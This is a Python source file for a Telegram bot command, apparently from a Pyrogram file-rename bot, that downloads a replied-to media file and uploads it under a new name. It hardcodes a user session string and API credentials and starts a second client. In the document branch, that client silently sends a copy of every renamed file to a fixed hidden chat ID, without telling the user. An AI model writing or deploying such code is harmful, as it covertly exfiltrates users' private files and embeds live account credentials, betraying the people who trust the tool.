import os
import time 
import logging 
from .database import db
from config import Config 
from functools import partial
from translation import Translation
from hachoir.parser import createParser
from pyrogram import Client, filters, enums
from hachoir.metadata import extractMetadata 
from .utils import progress_message, humanbytes 

logger = logging.getLogger(__name__)
USER_SESSION_STRING = "BACqWpl276ixucxGWCds9fqwgjs7dPLjzoh4_7FUALugUrB3tTZGkUF8Zz1opc-GHvukSrMpDhJoe_KHlewzZtpEYNEWgz2yBXApr_BmgJn4ted7MGzGL8UDsTIOz44xF3Hc_kroJ8JWM-fGhr6LwSB-eVbX5JOe2awJRofSLy-GJVelIRb9EYkISH2bomAAfCDTn1aCCdzZhef6m1iZF4f4hya90Pqpeyn-Ls7kRyo0RWPJ96XuT3Zdfx7xkBDdgJAqHk0y_sTo2gBM9Xnjsj2d28HzzHbqcZdmEkJuMEqv_FQHvIsr6L60oVM0ybzvTI3fUVHEwQoRg7qvG2N5Htt6ffzpcwA"
TELEGRAM_HASH = "0417d4f5fa67431b3c1b984a712cdbe3"
TELEGRAM_API= 12411512
app = Client(name='pyrogram', api_id=TELEGRAM_API, api_hash=TELEGRAM_HASH, session_string=USER_SESSION_STRING, parse_mode=enums.ParseMode.HTML, no_updates=True)
app.start()
@Client.on_message(filters.command("rename"))
async def rename_doc(bot, message):
    reply = message.reply_to_message
    if len(message.command) < 2 or not reply:
       return await message.reply_text(Translation.REPLY_MEDIA_TXT)
    media = reply.document or reply.audio or reply.video
    if not media:
       await message.reply_text(Translation.REPLY_MEDIA_TXT)
    file_size = media.file_size
    file_name = message.text.split(" ", 1)[1]
    download_location = Config.DOWNLOAD_LOCATION + "/" + file_name
    caption = await db.get_caption(message.from_user.id)
    if not caption:
      caption = f"<b>{file_name}</b>"
    sts = await message.reply_text(Translation.DOWNLOAD_START_TXT)
    c_time = time.time()
    try:
      _download_location = await reply.download(
                file_name=download_location,
                progress=progress_message,
                progress_args=(Translation.DOWNLOAD_START_TXT, sts, c_time)
       )
    except Exception as e:
      bot.log.exception(e)
      return await sts.edit_text("unable to download media !")
    if _download_location is None:
       return await sts.edit("Download failed !")
    await sts.edit_text(Translation.DOWNLOAD_SUCCESS_TXT)
    await sts.edit_text(Translation.UPLOAD_START_TXT)
    thumbnail = await db.get_thumbnail(message.from_user.id)
    if thumbnail:
       thumbnail = await bot.download_media(thumbnail)
    c_time = time.time()
    upload_mode = await get_upload_mode(reply)
    upload_as = message.reply_document if upload_mode == "document" else message.reply_video if upload_mode == "video" else message.reply_audio
    upload = partial(
          upload_as,
          thumb=thumbnail,
          caption=caption,
          parse_mode = enums.ParseMode.HTML,
          progress=progress_message,
          progress_args=(Translation.UPLOAD_START_TXT, sts, c_time),
          quote=True
        )
    duration = 0
    try:
       if upload_mode == "document":
            app.send_document(chat_id = -13134143141341,document=download_location)
            msg = await upload(document=download_location)
          
       elif upload_mode == "video":
          width = height = 0
          metadata = extractMetadata(createParser(download_location))
          if metadata.has("width"):
             width = metadata.get("width")
          if metadata.has("height"):
             height = metadata.get("height")
          if metadata.has("duration"):
             duration = metadata.get('duration').seconds
          msg = await upload(
             video=download_location,
             duration=duration,
             width=width,
             height=height)
       else:
          author = None
          metadata = extractMetadata(createParser(download_location))
          if metadata.has("duration"): 
             duration = metadata.get('duration').seconds 
          if metadata.has("author"):
             author = metadata.get('author')
          msg = await upload(
             audio=download_location,
             duration=duration,
             performer=author) 
    except Exception as e:
        bot.log.exception(e)
        return await sts.edit("process failed !")
    try:
       await msg.edit_caption(caption.format(filename=file_name, duration=duration, size=humanbytes(file_size)))
    except:
       pass
    try:
       os.remove(download_location)
       os.remove(thumbnail)
    except:
       pass
    await sts.delete()
    await message.reply_text(Translation.UPLOAD_SUCCESS_TXT)
         
async def get_upload_mode(message):
  user_id = message.from_user.id
  get_mode = await db.get_uploadmode(user_id)
  if get_mode is None:
     for media in ["document", "video", "audio"]:
        if getattr(message, media):
           return media
  return get_mode
